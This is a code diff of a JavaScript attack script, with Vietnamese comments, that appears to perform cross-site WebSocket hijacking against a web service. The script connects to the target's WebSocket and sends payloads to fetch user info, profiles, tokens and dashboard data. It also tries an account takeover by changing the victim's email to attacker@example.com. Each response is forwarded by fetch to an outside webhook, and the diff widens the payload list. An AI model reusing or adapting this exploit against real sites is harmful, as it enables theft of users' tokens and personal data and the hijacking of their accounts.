@@ -17,7 +17,7 @@
         function sendToWebhook(message) {
             fetch(`${webhookUrl}?data=${encodeURIComponent(message)}`, {
                 method: "GET",
-                mode: "no-cors" // Để tránh lỗi CORS khi gửi đến webhook
+                mode: "no-cors"
             })
             .then(response => console.log("Webhook sent:", message))
             .catch(error => console.error("Webhook error:", error));
@@ -29,19 +29,25 @@
         // Khi WebSocket mở
         ws.onopen = function() {
             console.log("WebSocket connected!");
-            sendToWebhook("WebSocket connected");
+            sendToWebhook("WebSocket connected from sites.id.vn");
 
             // Gửi yêu cầu khởi tạo
             ws.send('t s main');
             sendToWebhook("Sent: t s main");
 
-            // Gửi các yêu cầu chung để lấy thông tin user
-            // Thử các payload không phụ thuộc vào ID cụ thể
+            // Gửi các yêu cầu tương tự như trong Developer Tools, nhưng ở dạng chung
             const payloads = [
-                JSON.stringify({ "action": "get_user_info" }), // Lấy thông tin user
-                JSON.stringify({ "action": "get_profile" }),   // Lấy profile user
-                JSON.stringify({ "action": "get_token" }),     // Lấy token (nếu có)
-                JSON.stringify({ "action": "update_email", "email": "attacker@example.com" }) // Thử thay đổi email
+                't g 1', // Yêu cầu lấy thông tin dashboard (không cần ID cụ thể)
+                't g 2', // Yêu cầu khác liên quan đến dashboard
+                't g 3', // Yêu cầu khác
+                't g 4', // Yêu cầu liên quan đến tìm kiếm
+                // Thêm các payload khác để lấy thông tin user
+                JSON.stringify({ "action": "get_user_info" }),
+                JSON.stringify({ "action": "get_profile" }),
+                JSON.stringify({ "action": "get_token" }),
+                JSON.stringify({ "action": "get_dashboard" }),
+                JSON.stringify({ "action": "get_search" }),
+                JSON.stringify({ "action": "update_email", "email": "attacker@example.com" })
             ];
 
             payloads.forEach((payload, index) => {
